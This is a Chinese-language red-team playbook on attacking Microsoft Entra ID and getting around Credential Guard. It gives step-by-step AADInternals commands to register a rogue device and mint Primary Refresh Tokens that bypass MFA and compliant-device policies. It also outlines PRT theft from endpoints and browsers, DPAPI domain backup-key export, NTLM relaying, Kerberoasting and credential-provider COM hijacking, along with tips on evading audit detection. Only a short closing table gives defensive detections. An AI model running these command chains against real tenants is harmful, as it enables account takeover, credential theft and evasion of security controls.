# 云身份与防护绕过 — Entra 深化与新一代 LSASS 防护下的替代路线

## Entra 设备身份与 PRT — 设备对象=新身份,拿到 PRT 能干嘛

来源:AADInternals 函数清单为 `~/tools/src/AADInternals/*.ps1` grep 实测(带行号);mimikatz 证据为本机二进制 strings 实测;PRT 概念为微软公开文档口径

**设备对象=新身份**:Entra 里除了用户,还有 device 对象(AzureAD 注册/加入/混合加入三种姿态)。条件访问策略大量依赖"从合规设备/加入设备发起"——设备本身成了可以"拥有"的身份资产:攻击者注册一台受自己控制的设备,后续请求就天然带上"设备可信"的光环。**PRT(Primary Refresh Token)** 是设备+用户绑定的长效令牌:初次交互登录成功后由 Entra 颁发,存放在设备的 CloudAP(Cloud Authentication Provider)缓存/TPM 里,操作系统用它做非交互式 SSO——浏览器访问云资源、Outlook、OneDrive 全靠它免密续票。**PRT 的三大含金量:①长效(策略级有效期,远超普通刷新令牌);②继承 MFA 声明(拿到 PRT 的请求自动"已过 MFA");③绑定设备信任声明(条件访问里"要求合规设备"的策略直接放行)**——所以云侧红队的目标清单里,PRT 排在密码前面。

注意: PRT 与 ADFS 令牌(15 号)是"同权重"的云侧票证:黄金 ADFS 伪造的是联邦 SAML 断言(打的是 ADFS 服务器),PRT 走的是 Entra 原生设备/用户链(打的是端点或注册流)——托管环境(无 ADFS)里 PRT 链是唯一"票证级"路线,联邦环境两条都通;16 号的 Seamless SSO(AZUREADSSOACC$ Kerberos)是第三条,混合环境可三线互备。三者拿到的凭据都进 10 号凭据台账登记。

## PRT 窃取链 — mimikatz 端侧思路 + AADInternals 全链 + 合法 PRT 请求

来源:AADInternals 命令链取自 PRT.ps1 源码注释中的官方示例(逐行实测存在);mimikatz 部分为本机 strings 证据+公开思路(未在本机 Windows 实机验证,已标注)

```powershell
# ===== 链 A:合法 PRT 请求思路(自注册设备,不碰受害者端点——最干净) =====
# 前提:手里已有任一有效用户凭据(密码/TAP/SAML 令牌都行,见参数)。思路:
# 用 AADJoin 令牌把一台"属于你"的设备注册进租户 → 用设备证书+用户凭据给该用户签发全新 PRT
# → 从此这台"设备"就是合规条件访问的通行证。源码示例链(PRT.ps1 注释原文实测):
Get-AADIntAccessTokenForAADJoin -SaveToCache
Join-AADIntAzureAD -DeviceName "<任意设备名>" -DeviceType "Commodore" -OSVersion "10.0.18363.0"
#   输出 DeviceId 与设备证书 <DeviceId>.pfx;本地 SID/Additional SIDs 一并给出
$creds = Get-Credential                                  # 目标用户的凭据
$prtKeys = Get-AADIntUserPRTKeys -PfxFileName .\<DeviceId>.pfx -Credentials $creds
#   返回 json:refresh_token + session_key(即一组全新 PRT 材料)
$prtToken = New-AADIntUserPRTToken -Settings $prtKeys     # 或 -RefreshToken <..> -SessionKey <..>
#   输出 JWT 形态的 PRT;接着任选目标换访问令牌(全部 -PRTToken 参数实测):
Get-AADIntAccessTokenForMSGraph -PRTToken $prtToken -SaveToCache
Get-AADIntAccessTokenForEXO -PRTToken $prtToken
Get-AADIntAccessTokenForCloudShell -PRTToken $prtToken    # 直接进 Cloud Shell(思路)

# Get-AADIntUserPRTKeys 的全部鉴权材料入口(源码参数表实测,按手头材料选):
#   -Credentials <凭据> | -UseRefreshToken(缓存刷新令牌) | -SAMLToken <断言>(15 号 ADFS 链来的就用它)
#   | -WHfBKeyFileName <PEM>(WHfB 密钥当身份证明) | -UseDeviceCertForWHfB(设备证书兼任)
#   | -TransportKeyFileName <PEM> | -Certificate <x509> / -PfxFileName <pfx> [-PfxPassword <密码>]
```

```powershell
# ===== 链 B:端点窃取(拿到受害者工作站 SYSTEM 后,把真 PRT 拖出来复用) =====
# 思路段(strings 实证 + 公开研究,未在本机实机验证):
# 1) CloudAP 缓存在 C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Windows\CloudAPCache
#    (公开路径,以实机为准);mimikatz 2.2.0 本机二进制含 cloudap 命令表项("Lists CloudAp credentials",
#    挂 dpapi 模块下),配合 /keyvalue /derivedkey /context /keyname 参数处理 TPM 派生材料(strings 实证)
# 2) TPM 绑定的 PRT 拿不到原始密钥时走"派生密钥"思路:
#    AADInternals 的 Get-AADIntPRTDerivedKey 实现了 NIST SP800-108 HMAC-SHA256 派生
#    (标签 "AzureAD-SecureConversation",源码 PRT_Utils.ps1:236 实证)——
#    即微软自己用会话密钥+context 派生传输密钥,拿到会话密钥与 context 即可离线复算
# 3) 拿到 PRT 材料(refresh_token+session_key)后回到链 A 的 New-AADIntUserPRTToken 续链
```

```powershell
# ===== 链 C:浏览器 PRT cookie 思路(不落地 SYSTEM 的轻量路线) =====
# 思路段:登录态浏览器里 PRT 以加密 cookie 形式参与 SSO;公开工具链(ROADtools 家族等,非本机、未实测)
# 能从浏览器进程/配置里提 PRT cookie 后重放;本机对应能力 = 上面的 Get-AADIntAccessTokenWithPRTToken
# (PRT_Utils.ps1:284,参数 Cookie/Resource/ClientId 实测)——cookie 在手即可换任意资源访问令牌
```

参数速查:
- 链 A 一条龙五个函数(官方示例顺序):`Get-AADIntAccessTokenForAADJoin` → `Join-AADIntAzureAD` → `Get-AADIntUserPRTKeys` → `New-AADIntUserPRTToken` → `Get-AADIntAccessTokenFor*`(20 个目标任选)
- `New-AADIntUserPRTToken` 参数集:`-RefreshToken`+`-SessionKey`(成对)或 `-Settings`(json 一把喂);`-KdfV2` 默认开(源码实证);`-Context` 可省(有默认值)
- `Get-AADIntSignedPRTRequest`/`Get-AADIntAccessTokenWithSignedPRTRequest`(2025-02 新增,源码日期注释实证)是新式签名请求路线,老 PRT 路线被封堵时的备选
- 设备代码流钓鱼:`Get-AADIntAccessTokenUsingDeviceCode`(实测存在),投递手法见 18 号

注意: 链 A 的"合法"指请求形态完全合规——Entra 无法区分红队注册的设备与真设备,这正是设备信任模型的软肋(见下一节);设备注册会留 Audit 日志(第五节),红队时间窗内注册的"奇怪设备名"别起太张扬;链 B 需要 SYSTEM+目标用户 DPAPI 上下文,13 号的 PPL/落地工具箱是前置;PRT 材料落 json 后按 10 号凭据台账登记(refresh_token 当密码记);链 B/C 属"未实机验证"路线,strings/源码证据之外的部分以实机为准,失败了回链 A(它不依赖受害者端点任何东西)。

## Device Trust / WHfB — 合规设备围城下的思路(不虚构命令)

来源:AADInternals 参数级证据为源码实测;攻击思路为公开研究共识,本节无实机验证

**围城**:条件访问最常见的三种"设备信任"策略——要求 MFA、要求"合规设备"(Intune 合规)、要求"已加入设备"(Entra join/混合 join)。密码+MFA 可以钓(18 号),设备信任钓不动,于是思路转向**让自己拥有一个"真"设备身份**:上一节链 A 的 `Join-AADIntAzureAD` 自注册就是主路——注册出的设备对"已注册"类条件满足,但**"合规"要过 Intune 合规评估、"加入"要写 workbook/域联动**,注册≠合规,策略要求合规时纯注册不够;公开思路是让设备真进 Intune 管理(MDM 注册后把合规项做满)——AADInternals 里有 MDM 面(`Join-DeviceToIntune`/`Get-AADIntAccessTokenForIntuneMDM` 实测存在),具体注册-合规链路属思路段,命令不虚构。**WHfB(Windows Hello for Business)**:非对称密钥存在 TPM 里,口令/哈希面直接消失——但密钥证明身份的特性被 AADInternals 认:源码参数 `-WHfBKeyFileName`/`-UseDeviceCertForWHfB`(Get-UserPRTKeys 实测)就是"拿 WHfB 密钥/设备证书当身份证明去签发 PRT"——即**从被控端点导出 WHfB 私钥材料(或整 TPM 上下文)后,离线侧仍能把 WHfB 变回 PRT**,等于把"无密码强认证"折回"有密码等效物"。此外三条旁门:①设备代码流钓鱼(`Get-AADIntAccessTokenUsingDeviceCode` 实测,见 18 号投递);②旧设备残留:退役未禁用的设备对象+其证书可继续注册请求(Audit 里能查,攻击面在管理侧);③16 号 Seamless SSO 绕 MFA(AZUREADSSOACC$ 路线,混合环境专属)。

注意: 本节全为思路与参数级证据,任何具体命令未实机验证即不写;设备合规链做完的效果=条件访问"要求合规设备"策略对你的流量放行,代价是设备出现在 Intune 清单里(第五节检测点);蓝队视角的对策(设备过滤器、注册限制、废弃设备清理)见第五节对照表。

## Credential Guard 绕过三代 — VBS 隔离下的替代:不碰 LSASS 改打别处

来源:一代/二代路线 13 号文档已有实测小节(PPL 绕过、DPAPI 域备份密钥);三代为本文件思路整合,交叉引用 05/12/17

**三代演进**:一代=LSASS 无保护,`sekurlsa::logonpasswords` 直抓(13 号);二代=RunAsPPL(PPL),PPLdump/HandleKatz/BYOVD 强拆(13 号 PPL 小节有实测特征);三代=**Credential Guard/VBS——LSASS 跑进虚拟安全隔离区,普通进程(连管理员+PPL dump 工具)都摸不到那份内存,NTLM 哈希/TPM 密钥不再出现在常规 LSASS 空间**。硬碰思路(BYOVD 打 VBS 本身)成本高、EDR 高危,实战转向"不碰 LSASS"的四条替代面:

```bash
# ===== 替代面 1:DPAPI(13 号已有完整实测小节,这里给衔接)=====
# Credential Guard 不保护 DPAPI;域备份密钥一个域一份,任一域用户即可导出(13 号实测):
impacket-dpapi backupkeys --export -t <域名>/<用户名>:<密码>@<域控IP>   # 拿 key_<域名>.pvk
# 之后域内任何用户的 DPAPI 密文(浏览器保存密码/凭据管理器/Chrome Cookie)全可离线解——
# 端侧被 CG 锁死,但浏览器等应用自己落的密文不设防。详见 13 号"DPAPI 域备份密钥"小节

# ===== 替代面 2:磁盘凭据(完全绕开内存)=====
# autologon 注册表/unattend.xml/sysprep 应答/GPP cpassword(04/07 有破解链)/保存的 .rdp/
# WiFi XML/各应用配置文件——CG 管内存不管盘;13 号"凭据收集面扩大"小节有成套条子(实测)

# ===== 替代面 3:网络线凭据(CG 挡的是"存",挡不住"发")=====
# NTLM 认证照常走网络:responder 抓哈希 + ntlmrelayx 中继(05/16 号实测),
# Kerberos 照常走线:AS-REP/Kerberoast 离线烤(12 号)——全部不需要碰 LSASS;
# SSPI 钓鱼思路:伪造服务端(SQL/SMB/HTTP 认证点)诱客户端 SSPI 出凭据再中继,
# 交叉认证/强制认证手法(PetitPotam/coercer)见 11/16 号

# ===== 替代面 4:接口监控(Credential Provider/COM 层)=====
# 思路:17 号 COM 劫持(HKCU 覆盖 CLSID)同样适用凭据面——劫持登录相关 COM 组件/
# 凭据提供程序(Credential Provider 本身是 COM 对象)监控用户键入,键入即捕获,
# 与 CG 无关(用户自己把明文交给你);具体 CLSID 选取属思路段,不虚构,17 号有劫持全流程
```

**为什么不硬刚**:Skeleton Key(17 号)patch 的是 LSASS 进程内 NTLM 校验函数,VBS 隔离下普通进程根本写不进那份内存——**CG 环境明确不适用**;同理 17 号 SSP/LSA 插件类持久化在 CG 下大量失效。DSRM(17 号)这类不依赖 LSASS 补丁的路线仍可用——持久化选型先问"目标开没开 CG"。查 CG 是否开启:`msinfo32` 看虚拟化安全/`Device Guard` 状态,或注册表 `HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard` 下 `EnableVirtualizationBasedSecurity`(部署事实,思路级)。

参数速查(全部指向已有文档,不重复展开):
- DPAPI 三件套:backupkeys/masterkey/credential——13 号实测小节
- 网络线:responder/ntlmrelayx/mitm6(05、16 号实测小节)
- Kerberoast/AS-REP:12 号;证书强制认证链:11 号
- COM 劫持全流程:17 号;BYOVD/EDR 对抗代价评估:20 号

注意: 四条替代面的共同点=**目标是"凭据的新鲜来源"而非"内存里的存货"**——打 CG 环境时把 DPAPI+磁盘+网络线当第一梯队,LSASS 转储只当"运气好没开 CG"的福利;替代面 3 的中继路线与 16 号 Kerberos 中继直接衔接;CG 与 PPL 是叠加关系(开了 CG 必有 PPL 效果),别按"13 号 PPL 绕过成功=CG 也能绕"误推;蓝队视角:CG 显著抬高成本但 DPAPI 域备份钥匙是结构性软肋(一个域用户换全域 DPAPI),配合第五节检测面看。

| Join-AADIntAzureAD 自注册设备(链 A) | Entra 管理中心 → 设备 → All devices(新设备突增);**Audit logs** 里 "Register device"/"Join device" 活动(记录发起者/时间/设备名) | 设备注册限制(仅允许合规通道/指定用户组)、新设备告警、奇怪设备名/OS 版本入规则 |
